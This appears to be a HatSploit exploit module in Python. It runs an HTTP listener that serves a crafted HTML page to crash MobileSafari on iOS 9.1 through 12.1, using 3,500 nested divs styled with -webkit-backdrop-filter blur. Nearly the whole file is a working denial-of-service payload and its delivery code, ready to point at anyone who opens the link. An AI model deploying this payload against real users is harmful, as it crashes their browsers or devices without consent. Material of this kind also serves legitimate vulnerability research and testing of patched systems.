#!/usr/bin/env python3

#
# This module requires HatSploit: https://hatsploit.netlify.app
# Current source: https://github.com/EntySec/HatSploit
#

from hatsploit.lib.module import Module

from pex.listener.http import HTTPListener


class HatSploitModule(Module, HTTPListener):
    details = {
        'Category': "exploit",
        'Name': "iOS Safari WebKit Filter DoS",
        'Module': "exploit/apple_ios/safari/webkit_filter_dos",
        'Authors': [
            'Ivan Nikolsky (enty8080) - module developer',
            'Sabri Haddouche (pwnsdx) - vulnerability researcher'
        ],
        'Description': "iOS 9.1 till 12.1 MobileSafari.app WebKit Filter DoS.",
        'Platform': "apple_ios",
        'Rank': "high"
    }

    options = {
        'SRVHOST': {
            'Description': "Host to start http server on.",
            'Value': "0.0.0.0",
            'Type': "ip",
            'Required': True
        },
        'SRVPORT': {
            'Description': "Port to start http server on.",
            'Value': 8080,
            'Type': "port",
            'Required': True
        },
        'URLPATH': {
            'Description': "File path on server.",
            'Value': "/",
            'Type': None,
            'Required': True
        }
    }

    def run(self):
        server_host, server_port, url_path = self.parse_options(self.options)

        def get(request):
            if request.path == url_path:
                self.print_process("Delivering payload...")

                request.send_response(200)
                request.send_header("Content-type", "text/html")
                request.end_headers()

                request.wfile.write(
                    (
                        "<html>"
                        "    <head>"
                        "        <meta content=\"text/html; charset=utf-8\" http-equiv=\"Content-Type\"/>"
                        "        <style>"
                        "            div {"
                        "                backdrop-filter: blur(10px);"
                        "                -webkit-backdrop-filter: blur(10px);"
                        "                width:10000px; height:10000px;"
                        "            }"
                        "        </style>"
                        "    </head>"
                        "    <body>"
                        f"        {'<div>' * 3500 + '</div>' * 3500}"
                        "    </body>"
                        "</html>"
                    ).encode()
                )

        listener = self.listen_http(
            server_host,
            server_port,
            {
                'GET': get
            }
        )

        if listener.listen():
            listener.accept()
            listener.stop()
